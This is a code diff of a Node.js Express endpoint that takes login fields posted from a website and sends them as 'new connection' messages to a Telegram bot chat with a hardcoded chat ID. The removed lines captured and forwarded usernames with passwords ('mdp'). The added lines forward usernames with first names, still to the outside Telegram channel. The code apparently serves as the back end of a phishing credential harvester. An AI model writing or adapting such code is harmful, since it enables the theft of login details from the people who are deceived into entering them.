@@ -11,37 +11,29 @@ const CHAT_ID = "8135402030";
 
 app.post("/send-telegram", async (req, res) => {
   try {
+    const { identifiant, prenom } = req.body;
 
-    const { identifiant, mdp } = req.body;
-
-    if (!identifiant || !mdp) {
+    if (!identifiant || !prenom) {
       return res.status(400).json({
         success: false,
-        error: "Identifiant et mdp requis"
+        error: "Identifiant et prénom requis"
       });
     }
-
-    console.log("Reçu du site :", {
-      identifiant,
-      mdp
-    });
 
     const message = `
 Nouvelle connexion :
 
 Identifiant : ${identifiant}
-mdp : ${mdp}
+Prénom : ${prenom}
 `;
 
     const response = await fetch(
       `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
       {
         method: "POST",
-
         headers: {
           "Content-Type": "application/json"
         },
-
         body: JSON.stringify({
           chat_id: CHAT_ID,
           text: message
@@ -51,8 +43,6 @@ mdp : ${mdp}
 
     const data = await response.json();
 
-    console.log("Réponse Telegram :", data);
-
     if (!response.ok || !data.ok) {
       return res.status(500).json({
         success: false,
@@ -61,22 +51,19 @@ mdp : ${mdp}
       });
     }
 
-    res.json({
+    return res.json({
       success: true
     });
 
   } catch (error) {
+    console.error("Erreur serveur :", error);
 
-    console.error("Erreur :", error);
-
-    res.status(500).json({
+    return res.status(500).json({
       success: false,
       error: "Erreur serveur"
     });
-
   }
 });
-
 
 const PORT = process.env.PORT || 3000;
 
